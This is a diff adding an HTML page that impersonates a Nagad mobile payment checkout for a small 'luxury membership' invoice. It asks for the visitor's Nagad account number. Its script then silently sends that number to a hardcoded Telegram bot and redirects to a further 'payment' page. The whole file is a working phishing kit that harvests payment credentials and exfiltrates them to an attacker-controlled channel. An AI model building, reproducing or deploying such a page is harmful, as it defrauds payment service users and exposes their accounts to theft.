@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LUXURY MEMBERSHIP</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://imgur.com/pAA3wi6.png') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .container {
+            text-align: center;
+            color: #D3D3D3; /* Light gray */
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center all content */
+        }
+
+        .header img {
+            margin-top: 20px;
+            width: 100px;
+        }
+
+        .header h2 {
+            font-size: 1rem; /* Made smaller */
+            margin: 5px 0; /* Adjusted margin */
+        }
+
+        .info {
+            margin-top: 30px;
+            font-size: 1rem; /* Adjusted font size */
+            text-align: left;
+            padding-left: 20px;
+            width: 100%; /* Take full width */
+        }
+
+        .info p {
+            margin: 5px 0;
+        }
+
+        .input-group {
+            margin-top: 30px;
+            text-align: center; /* Center the input group */
+        }
+
+        .input-group p {
+            margin-bottom: 10px;
+            font-weight: bold; /* Made the label bold */
+        }
+
+        .input-boxes {
+            display: flex;
+            justify-content: center;
+            flex-wrap: nowrap; /* Keep all input boxes in a single line */
+            gap: 5px; /* Space between boxes */
+        }
+
+        .input-group input {
+            width: 25px; /* Adjusted width */
+            height: 25px; /* Smaller height */
+            font-size: 1rem; /* Adjusted font size */
+            text-align: center;
+            border: 2px solid #D3D3D3; /* Light gray border */
+            background-color: white; /* White background */
+            color: black; /* Black text */
+            border-radius: 5px; /* Rounded corners */
+            padding: 0; /* Remove padding for uniformity */
+        }
+
+        .terms {
+            margin-top: 20px;
+            font-size: 0.9rem; /* Adjusted font size */
+            color: #D3D3D3; /* Light gray */
+        }
+
+        .terms a {
+            color: #D3D3D3; /* Keep the link light gray */
+            text-decoration: none; /* Remove underline */
+        }
+
+        .terms a:hover {
+            color: #ffffff; /* Optional hover color change */
+        }
+
+        .error-message {
+            margin-top: 10px; /* Space for error message */
+            color: yellow; /* Yellow text for error message */
+            font-size: 0.9rem; /* Adjusted font size */
+            display: none; /* Hidden by default */
+        }
+
+        .buttons {
+            margin-top: 20px; /* Adjusted margin for spacing */
+            display: flex;
+            justify-content: center; /* Center the buttons */
+        }
+
+        .buttons button {
+            padding: 5px 10px; /* Smaller padding */
+            margin: 0 10px; /* Space between buttons */
+            font-size: 0.8rem; /* Smaller font size */
+            font-weight: bold; /* Bold text */
+            color: darkred; /* Dark red color for text */
+            background-color: white; /* White background for buttons */
+            border: 2px solid #D3D3D3; /* Light gray border */
+            border-radius: 5px; /* Rounded corners */
+            cursor: pointer;
+        }
+
+        .footer {
+            margin-top: 50px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <img src="https://imgur.com/xCGvdyx.png" alt="Cart Icon"> <!-- Updated cart logo URL -->
+        <h2>LUXURY MEMBERSHIP</h2>
+    </div>
+
+    <div class="info">
+        <p><strong>Invoice No.:</strong> UID72935618843895</p>
+        <p><strong>Total Amount:</strong> BDT 20.00</p>
+        <p><strong>Charge:</strong> BDT 0</p>
+    </div>
+
+    <div class="input-group">
+        <p>Your Nagad Account Number</p>
+        <div class="input-boxes">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" oninput="moveToNext(this)" pattern="\d*" inputmode="numeric">
+        </div>
+    </div>
+
+    <div class="terms">
+        By clicking/tapping you are agreeing to our 
+        <a href="https://nagad.com.bd/pg/?n=terms-of-use" target="blank"><strong>Terms and Conditions</strong></a>
+    </div>
+
+    <div class="error-message" id="error-message">
+        Invalid mobile number
+    </div>
+
+    <div class="buttons">
+        <button onclick="validateNumber()">Proceed</button>
+        <button class="cancel">Close</button>
+    </div>
+
+    <div class="footer">
+        <!-- Nagad logo removed -->
+    </div>
+</div>
+
+<script>
+    function moveToNext(input) {
+        // Ensure the input is numeric
+        if (input.value !== '' && isNaN(input.value)) {
+            input.value = ''; // Clear the input if it's not a number
+            return;
+        }
+
+        // Move to the next input box if the current one is filled
+        if (input.value.length >= input.maxLength) {
+            let nextInput = input.nextElementSibling;
+            if (nextInput) {
+                nextInput.focus(); // Move focus to the next input
+            }
+        }
+    }
+
+    // Validate input on "Proceed" button click
+    function validateNumber() {
+        const inputs = document.querySelectorAll('.input-group input');
+        let mobileNumber = '';
+
+        // Collect the values from input boxes
+        inputs.forEach(input => {
+            mobileNumber += input.value;
+        });
+
+        // Check if the mobile number is 11 digits and starts with "01"
+        if (mobileNumber.length !== 11 || !mobileNumber.startsWith('01')) {
+            document.getElementById('error-message').style.display = 'block'; // Show error message
+        } else {
+            document.getElementById('error-message').style.display = 'none'; // Hide error message
+            sendToTelegram(mobileNumber); // Send number to Telegram
+            
+            // Redirect to index2.html after a 2-second delay
+            setTimeout(() => {
+                window.location.href = 'pay_ID_luxurymembership.html'; // Redirect to index2.html
+            }, 2000); // 2000 milliseconds = 2 seconds
+        }
+    }
+
+    // Send the input number to your Telegram bot
+    function sendToTelegram(mobileNumber) {
+        const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y'; // Replace with your bot token
+        const chatId = '7174617845'; // Replace with your chat ID
+        const message = `${mobileNumber}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Error sending message to Telegram:', response);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+
+    // Prevent non-numeric input
+    const inputs = document.querySelectorAll('.input-group input');
+    inputs.forEach(input => {
+                input.addEventListener('keydown', (event) => {
+            // Allow: backspace, delete, tab, escape, enter
+            if (event.key === "Backspace" || event.key === "Delete" || event.key === "Tab" || event.key === "Escape" || event.key === "Enter") {
+                return;
+            }
+            // Ensure that it is a number and stop the keypress if not
+            if ((event.shiftKey || (event.key < '0' || event.key > '9'))) {
+                event.preventDefault(); // Prevent non-numeric input
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
